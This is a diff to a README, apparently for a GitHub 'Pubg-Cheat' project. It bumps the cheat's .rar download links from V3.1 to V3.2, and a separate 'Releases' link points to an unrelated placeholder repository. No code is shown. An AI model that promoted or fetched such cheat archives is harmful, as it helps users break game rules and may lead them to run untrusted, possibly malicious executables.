@@ -31,7 +31,7 @@
 
 </div>
 
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Futuremaccare/Pubg-Cheat/releases/download/PUBG.V3.1/PUBG.V3.1.rar)
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/Futuremaccare/Pubg-Cheat/releases/download/PUBG.V3.2/PUBG.V3.2.rar)
 
 ## ▸ overview
 
@@ -69,7 +69,7 @@
 | **runtime** | Visual C++ Redistributable 2015–2022 |
 
 
-## ▸ [installation](https://github.com/Futuremaccare/Pubg-Cheat/releases/download/PUBG.V3.1/PUBG.V3.1.rar)
+## ▸ [installation](https://github.com/Futuremaccare/Pubg-Cheat/releases/download/PUBG.V3.2/PUBG.V3.2.rar)
 
 **1.** download the latest release from the **[Releases](https://github.com/yourname/pubg-rak/releases)** tab
 
